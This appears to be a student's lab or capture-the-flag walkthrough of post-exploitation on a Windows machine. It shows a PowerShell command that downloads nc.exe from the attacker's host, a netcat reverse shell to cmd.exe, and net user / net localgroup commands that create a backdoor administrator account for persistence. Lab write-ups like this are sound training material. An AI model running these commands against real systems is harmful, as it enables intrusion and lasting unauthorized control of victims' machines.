Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.


1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.


From here We have done it manually: 

What we have done is just:

1. Just hosted a python server in the directory where we have nc.exe file..

2. From victim machine we used:

powershell -c wget "http://10.11.1.198:8080/nc.exe" -outfile "nc.exe"

3. With this we download nc.exe 

4. Run netcat on host

5. Run on win victim: nc.exe kali_ip port -e cmd.exe

This is done to get a shell.....

6. Now, use: whoami

We are nt authority\system

7.  Now we have to make a previledged user to make persistance

8. For user creation: net user <username> <password> /add
   
   For adding user to admin: net localgroup "Administrators" <username> /add   	

9. Now check it:

use : net users

use : net localgroup "Administrators"

10. Now we can logout of wade user, with which we previusly logged in.

Now we will login via new previledged user that we created for persistance

11. Now we go to Control panel ---> User Account ---> User Accounts

We will see it is Admin
